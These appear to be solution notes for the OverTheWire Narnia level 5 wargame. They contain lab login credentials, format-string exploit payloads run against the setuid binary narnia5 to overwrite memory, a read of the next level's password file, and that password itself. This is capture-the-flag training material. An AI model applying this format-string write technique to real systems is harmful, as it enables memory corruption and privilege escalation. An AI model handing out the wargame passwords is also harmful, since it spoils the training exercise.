sftp -oPort=2226 narnia5@narnia.labs.overthewire.org
Ni3xHPEuuw
get /narnia/narnia5
get /narnia/narnia5.c
exit

sshpass -p 'Ni3xHPEuuw' ssh narnia5@narnia.labs.overthewire.org -p 2226
cd /narnia

./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAA' + b'\xb0\xd3\xff\xff%492u%n')")

./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'\xc0\xd1\xff\xff________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________%n')")

./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'\xb0\xd3\xff\xff\xb0\xd3\xff\xff%492u%n')")


./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'%u_%u_%u')")

cat /etc/narnia_pass/narnia6   
# Password: BNSjoSDeGL